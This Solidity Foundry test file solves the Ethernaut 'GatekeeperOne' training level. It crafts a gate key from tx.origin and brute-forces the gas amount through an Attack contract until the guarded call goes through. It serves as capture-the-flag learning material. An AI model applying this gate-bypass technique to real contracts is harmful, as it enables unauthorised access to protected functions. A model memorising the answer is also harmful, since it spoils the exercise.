// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "../src/GatekeeperOne/GatekeeperOneFactory.sol";
import "../src/Ethernaut.sol";

contract GatekeeperOneTest is StdCheats, Test {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testGatekeeperOneHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();
        ethernaut.registerLevel(gatekeeperOneFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(gatekeeperOneFactory);
        GatekeeperOne ethernautGatekeeperOne = GatekeeperOne(payable(levelAddress));
        vm.stopPrank();

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        Attack attack = new Attack(levelAddress);

        // 1.
        // uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
        // uint32(uint64(_gateKey)) != uint64(_gateKey)
        // uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
        //
        // 2.
        // k = uint64(_gateKey)
        //      ||
        //      \/
        // uint32(k) == uint16(k)
        // uint32(k) != k
        // uint32(k) == uint16(uint160(tx.origin))

        uint16 k16 = uint16(uint160(tx.origin)); //uint16(k) = uint16(uint160(tx.origin))
        uint64 k64 = uint64(1 << 63) + uint64(k16); // uint32(k) != k
        bytes8 key = bytes8(k64);

        uint256 i = 0;
        while (i < 8191) {
            try attack.attack(1000000 + i, key) {
                break;
            } catch {
                i++;
                continue;
            }
        }

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        vm.startPrank(tx.origin);
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {
    GatekeeperOne gatekeeperOne;

    constructor(address _gatekeeperOne) {
        gatekeeperOne = GatekeeperOne(_gatekeeperOne);
    }

    function attack(uint256 gas, bytes8 key) public {
        gatekeeperOne.enter{gas: gas}(key);
    }
}
